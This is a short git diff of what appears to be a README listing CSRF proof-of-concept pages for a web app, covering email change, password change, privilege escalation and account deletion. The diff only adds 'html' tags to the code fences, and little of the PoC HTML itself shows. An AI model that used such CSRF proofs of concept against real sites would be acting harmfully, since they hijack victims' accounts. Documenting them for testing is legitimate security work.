@@ -16,7 +16,7 @@ NODE_ENV=production npm start # start server
 1. Login as admin
 3. Use any of the CSRF POCs
 #### Change email
-```
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -28,7 +28,7 @@ NODE_ENV=production npm start # start server
 </html>
 ```
 #### Change password
-```
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -40,7 +40,7 @@ NODE_ENV=production npm start # start server
 </html>
 ```
 #### Privilege escalation
-```
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -52,7 +52,7 @@ NODE_ENV=production npm start # start server
 </html>
 ```
 #### Account deletion
-```
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
